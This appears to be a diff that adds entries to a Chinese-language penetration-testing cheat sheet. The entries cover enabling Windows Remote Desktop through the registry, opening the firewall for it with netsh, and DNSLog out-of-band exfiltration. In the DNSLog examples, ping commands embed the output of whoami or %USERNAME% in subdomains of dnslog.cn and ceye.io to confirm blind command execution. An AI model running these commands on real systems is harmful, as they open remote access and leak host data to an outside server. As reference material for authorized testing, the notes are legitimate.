@@ -190,3 +190,30 @@ SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system
 - /TR   taskrun      指定在这个计划时间运行的程序的路径和文件名。例如: C:\windows\system32\calc.exe
 
 ```
+
+
+
+**CMD开启rdp：**
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+
+**通过防火墙**
+键入以下命令以通过Windows防火墙启用远程桌面，然后按Enter：
+```
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
+
+**dnslog不只是可以ping，你还可以在里面带数据**
+
+比如linux,
+```
+ping `whoami`.soeowh.dnslog.cn
+```
+
+
+windows下就是
+```
+ping %USERNAME%.xxxxx.ceye.io
+```
+这么搞，在真正无回显的情况下判断系统版本
